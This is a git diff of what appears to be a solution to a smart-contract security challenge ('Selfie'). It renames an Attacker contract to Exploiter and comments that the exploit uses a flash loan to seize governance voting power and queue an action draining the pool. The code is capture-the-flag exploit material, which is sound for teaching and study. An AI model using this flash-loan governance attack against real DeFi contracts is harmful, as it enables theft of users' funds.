@@ -10,7 +10,7 @@ import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156
 
 
 
-contract Attacker is IERC3156FlashBorrower{
+contract Exploiter is IERC3156FlashBorrower{
 
     address payable immutable RECIVER;
     SimpleGovernance governance;
@@ -23,11 +23,11 @@ contract Attacker is IERC3156FlashBorrower{
     }
 
     function onFlashLoan(
-        address initiator,
+        address,
         address token,
         uint256 amount,
         uint256 fee,
-        bytes calldata data
+        bytes calldata
     ) external override returns (bytes32){
 
         bytes memory callData = abi.encodeCall(
@@ -43,7 +43,7 @@ contract Attacker is IERC3156FlashBorrower{
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
-    function attack() external {
+    function exploit() external {
         pool.flashLoan(this , governance.getVotingToken(), pool.maxFlashLoan(governance.getVotingToken()), bytes(""));
     }
 
@@ -108,9 +108,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        // console.log(address(this));
-        Attacker att = new Attacker(payable(recovery),governance,pool);
-        att.attack();
+        // Exploit: The exploit works by using a flash loan to gain control of the governance contract and queue an action to drain the pool.
+
+        Exploiter exploiter = new Exploiter(payable(recovery),governance,pool);
+        exploiter.exploit();
 
         skip(2 days);
 
